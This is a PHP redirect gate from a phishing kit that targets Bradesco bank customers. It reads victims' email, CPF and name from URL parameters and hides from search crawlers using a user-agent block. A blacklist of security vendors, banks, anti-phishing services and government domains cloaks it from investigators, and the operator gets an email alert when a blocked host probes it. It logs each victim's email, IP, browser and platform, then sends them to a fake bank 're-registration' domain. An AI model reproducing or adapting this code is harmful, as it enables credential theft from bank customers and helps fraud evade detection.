<?php
/*
?cliente= 	email normal ($email normal - $emailx base)
?cli=			cpf base ($cpfx)
?nm=			nome base ($nomex)
?key=		chave enviador+email ($key)
*/
	
ob_start();


function save_erro($msg){
	$fileerr = 'xerror.txt';
	$fp = @fopen($fileerr, "a");
	fwrite($fp,$msg);
	fclose($fp);
}	
	$e500 = '<script language="javascript">window.location.replace("about:blank");</script>';
	//block bots
	if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		$userAgents = array("Google", "SynHttpClient", "GoogleBot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "SynHttp");
		if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		echo $e500;
		exit;
		}
	}
	
	//erro 500
/* 	$e500 = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head>
	<title>500 Internal Server Errorr</title></head><body>
	<h1>Internal Server Error</h1>
	<p>The server encountered an internal error or
	misconfiguration and was unable to complete
	your request.</p>
	<p>Please contact the server administrator,
	administrator and inform them of the time the error occurred,
	and anything you might have done that may have
	caused the error.</p>
	<p>More information about this error may be available
	in the server error log.</p><hr><address></address></body></html>'; */

	
	//vars + email
	date_default_timezone_set('America/Sao_Paulo');
	$data = date("d-M-Y");
	$ip = $_SERVER['REMOTE_ADDR'];
	$Hora_Servidor = "+0";
	$acerto = time() + ($Hora_Servidor * 60 * 60);
	$hora = date("H:i:s", $acerto);
	$email = $_GET['cliente'];
	$emlx = base64_encode($email);
	$nomex = base64_encode($_GET['nm']);
	$cpfx = $_GET['cid'];
	$addr = gethostbyaddr($ip);
	$ipmd5 = md5($ip);
	$chave = 'NFLX';
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
/*	$key = md5($chave.$email);
	if($_GET['key'] != $key){
		$errom = "[CHAVE INVALIDA] - $email - $ip - $addr" . PHP_EOL;
		save_erro($errom);
		echo $e500; 
		exit();		
	}
*/
	
		function getOS() { 
		global $user_agent;
		$os_platform    =   "Outro";
		$os_array       =   array(
								'/windows nt 10/i'     =>  'Win 10',
								'/windows nt 6.3/i'     =>  'Win 8.1',
								'/windows nt 6.2/i'     =>  'Win 8',
								'/windows nt 6.1/i'     =>  'Win 7',
								'/windows nt 6.0/i'     =>  'Win Vista',
								'/windows nt 5.2/i'     =>  'Win Server 2003/XP x64',
								'/windows nt 5.1/i'     =>  'Win XP',
								'/windows xp/i'         =>  'Win XP',
								'/windows nt 5.0/i'     =>  'Win 2000',
								'/windows me/i'         =>  'Win ME',
								'/win98/i'              =>  'Win 98',
								'/win95/i'              =>  'Win 95',
								'/win16/i'              =>  'Win 3.11',
								'/windows phone/i'      =>  'Win Phone',
								'/macintosh|mac os x/i' =>  'Mac OS X',
								'/mac_powerpc/i'        =>  'Mac OS 9',
								'/linux/i'              =>  'Linux',
								'/ubuntu/i'             =>  'Ubuntu',
								'/iphone/i'             =>  'iPhone',
								'/ipod/i'               =>  'iPod',
								'/ipad/i'               =>  'iPad',
								'/android/i'            =>  'Android',
								'/blackberry/i'         =>  'BlackBerry',
								'/webos/i'              =>  'Mobile'
							);

		foreach ($os_array as $regex => $value) { 
			if (preg_match($regex, $user_agent)) {
				$os_platform    =   $value;
			}
		}   
		return $os_platform;
	}
	$user_os        =   getOS();
	
	//block email + host + ip blacklist
	if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
		$errom = "[EMAIL INVALIDO] - $email - $ip - $addr" . PHP_EOL;
		save_erro($errom);
		echo $e500; 
		exit();
	}
	else {
		//echo "ate aki ok";
		$uri = $_SERVER["REQUEST_URI"];
		$ipserver = $_SERVER["SERVER_ADDR"];
			
		$ipx = getenv("REMOTE_ADDR");
		$host = gethostbyaddr($ipx);

		$provedor = 'gmail'; //google chrome
		
		$banhosts = array("186.231.96.130","186-231-96-130.livetim.timbrasil.com.br", "iwgroup", "amazon", "copel", "consumer", "bradesco",
		"pish","santander",	"scotiabank", "google-bot", "google-proxy", "googleproxy", "netcraft.com", "ebay.com", "panda.com","microsoft.com",
		"wbinfo", "fbi.gov", "msn.com", "yahoo.com", "cia.gov", "bankofamerica", "viabcp", "veritas", "spamfirewall2", "barracuda", 
		"utfpr.edu.br", "rodobens.com.br", "marimex", "onlinedc", "penso", "antispam", "sescsp", "fasano", "nod32","antipishing","kapersky",
		"norton", "symantec","rsasecurity", "bancopopular", "paypal", "dnblead", "unicaja", "santander", "dufrio", "mx.", 
		"bb.com.br", "phish", "amazon", "cloud", "scaleway", "reverse", ".tor.", "linode", "dimenoc", "banesto", "cajamadrid", "bancopastor", 
		"rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign", "markmonitor", "anti-phishing", "pandasoftware", 
		"delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus", "nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", 
		"mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft", "sophos", "activescan", "avast", "bitdefender", "clamav", "clamwin", 
		"symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector", "letti", "itau", "eset", "spfbl",
		"santander", "dufrio", "mx.", "bradesco"); $m = "inflost";

		$x = count($banhosts);
		
		for ($y = 0; $y < $x; $y++) {
		   if (strpos($host ,$banhosts[$y])== true) {
			$errom = "[HOST BLOQUEADO] - $email - $ip - $addr" . PHP_EOL;
			save_erro($errom);   
			echo $e500;
			
			$web = $_SERVER["HTTP_HOST"];
			$inj = $_SERVER["REQUEST_URI"];
			$target = rawurldecode($web.$inj);
			@mail($m.'@'.$provedor.'.com', $banhosts[$y].' '.$target,$ipx);
			exit;
		   } 
		}
		
		//echo "ate aki 2 ok";
		function str_contains($haystack, $needle, $ignoreCase = false) {   if ($ignoreCase) {	   $haystack = strtolower($haystack);	   $needle  = strtolower($needle);   }   $needlePos = strpos($haystack, $needle);   return ($needlePos === false ? false : ($needlePos+1));}

		$file = fopen("xblock-mail.txt", "r");
		while (!feof($file)) { $members[] = fgets($file); }
		fclose($file);
		foreach ($members as $x){ 
			$x = trim($x); 
			if (str_contains($email , $x)) { 
				$errom = "[EMAIL BLACKLIST] $x - $email - $ip - $addr" . PHP_EOL;
				save_erro($errom);   
				echo $e500;
				exit;
				}	
			}

		$filex = fopen("xblock-ip.txt", "r");
		while (!feof($filex)) { $membersx[] = fgets($filex); }
		fclose($filex);
		foreach ($membersx as $xx){ 
			$xx = trim($xx); 
			if ($ip == $xx) { 
				$errom = "[IP BLACKLIST] $xx - $email - $ip - $addr" . PHP_EOL;
				save_erro($errom);   
				echo $e500;
				exit;
				} 
			}
		//echo "ate aki 3 ok";
		/*
		$details     = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
		$pais 		 = $details->country;
		$cid 		 = $details->city;
		$regiao		 = $details->region;
		
 		if ($pais != 'CL') {
			//header("HTTP/1.1 500 Internal Server Error");
			echo $e500; 
			$errom = "[IP NOT BR / ($pais) ] - $email - $ip - $addr" . PHP_EOL;
			save_erro($errom);   
			exit();
		} 
		*/
		//cookie 1h + navegador + write log
		$NomeDoCookie  = 'CookieContador';
		$ValorDoCookie = TRUE;
		$PrazoDoCookie = time() + 3600;
		if(!isset($_COOKIE["CookieContador"]) || $_COOKIE["CookieContador"] != TRUE):
			setcookie($NomeDoCookie, $ValorDoCookie, $PrazoDoCookie);

			//navegador
			$MSIE = strpos($_SERVER['HTTP_USER_AGENT'],"MSIE");
			$Firefox = strpos($_SERVER['HTTP_USER_AGENT'],"Firefox");
			$Mozilla = strpos($_SERVER['HTTP_USER_AGENT'],"Mozilla");
			$Chrome = strpos($_SERVER['HTTP_USER_AGENT'],"Chrome");
			$Chromium = strpos($_SERVER['HTTP_USER_AGENT'],"Chromium");
			$Safari = strpos($_SERVER['HTTP_USER_AGENT'],"Safari");
			$Opera = strpos($_SERVER['HTTP_USER_AGENT'],"Opera");

			if (($MSIE == true) || ($user_agent == '')) { 
				$navegador = "IE"; 
				$errom = "[NAVEGADOR BLOK / ($pais) ] - $email - $ip - $addr" . PHP_EOL;
				save_erro($errom);   
				echo $e500; 
				exit();
			}
			else if ($Firefox == true) { $navegador = "Firefox"; }
			else if ($Mozilla == true) { $navegador = "Firefox"; }
			else if ($Chrome == true) { $navegador = "Chrome"; }
			else if ($Chromium == true) { $navegador = "Chromium"; }
			else if ($Safari == true) { $navegador = "Safari"; }
			else if ($Opera == true) { $navegador = "Opera"; }
			else { $navegador = '<font size="1">'.$_SERVER['HTTP_USER_AGENT'].'</font>'; }

			//verifica plataforma
			$useragent = $_SERVER['HTTP_USER_AGENT'];
			$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
			$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
			$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
			$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
			$wphone = strpos($_SERVER['HTTP_USER_AGENT'],"Windows Phone");
			$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
			$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
			$symbian =  strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");

			if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian || $wphone == true) {
				$plataforma = 'MB ('.$user_os.')';
			} else {
				$plataforma = 'PC ('.$user_os.')'; 
			}			
			//cria log
			$registos = "xreg.txt";
			$linhas   = @count(file($registos));

			ignore_user_abort(false);

			if (!file_exists($registos))
			$fp = @fopen($registos, "w+");
			else
			$fp = @fopen($registos, "a");
			@flock ($fp, LOCK_EX);
			@fwrite($fp, "$data**$hora**$plataforma**$email**".$ip." (".$host.")**".$navegador."**".$pais.' - '.$cid.' '.$regiao. PHP_EOL);
			@flock ($fp, LOCK_UN);
			@fclose($fp);

			ignore_user_abort(true);
			endif;
	}
		$keyx  = md5($chave.$ip);
		$ulink = "https://validacao-seguro05.onthewifi.com/atendimento-Bradesco.recadastramentomobile/";
		header('Location: '.$ulink);
		exit();
?>